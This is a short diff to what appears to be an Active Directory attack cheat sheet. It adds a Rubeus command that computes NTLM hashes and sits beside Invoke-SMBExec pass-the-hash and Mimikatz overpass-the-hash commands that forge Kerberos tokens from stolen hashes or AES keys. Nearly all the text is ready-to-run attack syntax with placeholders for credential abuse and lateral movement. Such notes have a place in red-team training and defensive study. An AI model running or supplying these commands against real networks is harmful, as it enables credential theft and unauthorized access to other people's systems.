@@ -330,6 +330,11 @@ Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Has
 ### Overpass The Hash
 - Over Pass the hash (OPTH) generate tokens(kerberos) from hashes or keys. Needs elevation (Run as administrator)
 
+#### Calculate NTLM hash
+```
+.\Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
+```
+
 #### Mimikatz overpass the hash
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:powershell.exe"'
